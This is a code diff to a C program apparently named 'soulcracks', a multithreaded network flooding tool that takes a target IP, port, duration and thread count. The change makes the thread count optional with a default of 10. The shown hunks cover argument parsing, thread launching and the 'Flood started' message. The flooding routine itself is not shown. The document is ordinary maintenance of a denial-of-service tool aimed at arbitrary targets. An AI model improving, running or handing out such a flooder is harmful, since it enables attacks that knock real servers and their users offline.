@@ -7,7 +7,7 @@
 #include <time.h>
 
 void usage() {
-    printf("Usage: ./soulcracks ip port time threads\n");
+    printf("Usage: ./soulcracks ip port time [threads]\n");
     exit(1);
 }
 
@@ -70,26 +70,24 @@ void *attack(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
+    if (argc < 4 || argc > 5) { // We allow 4 or 5 arguments.
         usage();
     }
 
     char *ip = argv[1];
     int port = atoi(argv[2]);
     int time = atoi(argv[3]);
-    int threads = atoi(argv[4]);
+    int threads = (argc == 5) ? atoi(argv[4]) : 10; // Default to 10 threads if not provided.
 
     pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
 
     printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);
 
     for (int i = 0; i < threads; i++) {
-
         struct thread_data *data = malloc(sizeof(struct thread_data));
         data->ip = ip;
         data->port = port;
         data->time = time;
-
 
         if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
             perror("Thread creation failed");
